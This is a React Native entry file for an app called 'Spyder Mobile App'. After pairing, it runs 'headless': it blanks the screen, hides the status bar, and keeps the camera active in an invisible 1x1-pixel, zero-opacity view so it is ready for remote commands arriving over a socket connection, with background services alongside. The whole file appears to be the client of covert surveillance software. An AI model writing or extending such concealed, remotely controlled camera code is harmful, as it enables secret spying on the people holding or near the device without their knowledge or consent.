/**
 * Spyder Mobile App
 *
 * AUTO MODE: No more manual flag switching!
 * - No credentials → Shows pairing UI
 * - Has credentials → Headless mode (blank screen), runs services in background
 */

import React, { useState, useEffect, useRef, useCallback } from 'react';
import { StatusBar, View, StyleSheet, ActivityIndicator } from 'react-native';
import { SafeAreaProvider } from 'react-native-safe-area-context';
import { Camera, useCameraDevice } from 'react-native-vision-camera';
import { authService, socketService, pushNotificationService, backgroundService, commandHandler, cameraService } from './src/services';
import { PairingScreen } from './src/screens';
import type { CameraPosition } from './src/types';

type AppMode = 'loading' | 'unpaired' | 'paired';

function App(): React.JSX.Element {
  const [appMode, setAppMode] = useState<AppMode>('loading');
  const [isConnected, setIsConnected] = useState(false);
  const servicesInitialized = useRef(false);
  const [cameraPosition, setCameraPosition] = useState<CameraPosition>('back');
  const cameraRef = useRef<Camera>(null);

  // Camera devices - fetch both so switching is instant
  const backDevice = useCameraDevice('back');
  const frontDevice = useCameraDevice('front');
  const device = cameraPosition === 'back' ? backDevice : frontDevice;

  // Camera initialized callback
  const onCameraInitialized = useCallback(() => {
    console.log('[App] Camera initialized, setting ref in service');
    if (cameraRef.current) {
      cameraService.setCameraRef(cameraRef.current);
    }
  }, []);

  // Listen for camera position changes
  useEffect(() => {
    const handlePositionChange = (position: CameraPosition) => {
      console.log('[App] Camera position changed:', position);
      setCameraPosition(position);
    };

    cameraService.onPositionChange(handlePositionChange);
    return () => cameraService.offPositionChange(handlePositionChange);
  }, []);

  // Update camera ref when device changes
  useEffect(() => {
    console.log('[App] Camera device status - back:', !!backDevice, 'front:', !!frontDevice, 'selected:', cameraPosition);
  }, [backDevice, frontDevice, cameraPosition]);

  useEffect(() => {
    initializeApp();

    // Listen for connection status changes
    const handleConnect = () => setIsConnected(true);
    const handleDisconnect = () => setIsConnected(false);
    
    socketService.on('connect', handleConnect);
    socketService.on('disconnect', handleDisconnect);

    return () => {
      socketService.off('connect', handleConnect);
      socketService.off('disconnect', handleDisconnect);
    };
  }, []);

  const initializeApp = async () => {
    console.log('[App] Initializing in auto mode...');

    try {
      // Check for stored credentials
      const isAuthenticated = await authService.initialize();
      console.log('[App] Credentials found:', isAuthenticated);

      if (isAuthenticated) {
        // Already paired - start services and show minimal UI
        await startBackgroundServices();
        setAppMode('paired');
      } else {
        // Not paired - show pairing screen
        setAppMode('unpaired');
      }
    } catch (error) {
      console.error('[App] Initialization failed:', error);
      setAppMode('unpaired');
    }
  };

  const startBackgroundServices = async () => {
    if (servicesInitialized.current) {
      console.log('[App] Services already initialized.');
      return;
    }

    console.log('[App] Starting background services...');

    const token = authService.getToken();
    const deviceId = authService.getDeviceId();

    if (!token || !deviceId) {
      console.error('[App] Cannot start services: missing credentials.');
      return;
    }

    try {
      await socketService.connectWithAutoRefresh();
      commandHandler.initialize();
      await pushNotificationService.initialize();
      await backgroundService.initialize();
      await backgroundService.start();

      servicesInitialized.current = true;
      setIsConnected(socketService.isConnected());
      console.log('[App] Background services started successfully.');
    } catch (error) {
      console.error('[App] Failed to start background services:', error);
    }
  };

  const handlePaired = async () => {
    console.log('[App] Pairing complete, starting services...');
    await startBackgroundServices();
    setAppMode('paired');
  };

  // Loading state
  if (appMode === 'loading') {
    return (
      <View style={styles.container}>
        <StatusBar barStyle="light-content" backgroundColor="#1c1c1e" />
        <ActivityIndicator size="small" color="#8e8e93" />
      </View>
    );
  }

  // Not paired - show pairing screen
  if (appMode === 'unpaired') {
    return (
      <SafeAreaProvider>
        <StatusBar barStyle="light-content" backgroundColor="#0f172a" />
        <PairingScreen onPaired={handlePaired} />
      </SafeAreaProvider>
    );
  }

  // Paired - headless mode, just blank screen with hidden camera
  return (
    <View style={styles.container}>
      <StatusBar hidden />
      {/* Hidden camera - always active so it's ready for remote commands */}
      {device && (
        <Camera
          ref={cameraRef}
          style={styles.hiddenCamera}
          device={device}
          isActive={true}
          photo={true}
          onInitialized={onCameraInitialized}
          onError={(error) => console.log('[App] Camera error:', error.message)}
        />
      )}
    </View>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#000000',
  },
  hiddenCamera: {
    width: 1,
    height: 1,
    position: 'absolute',
    opacity: 0,
  },
});

export default App;
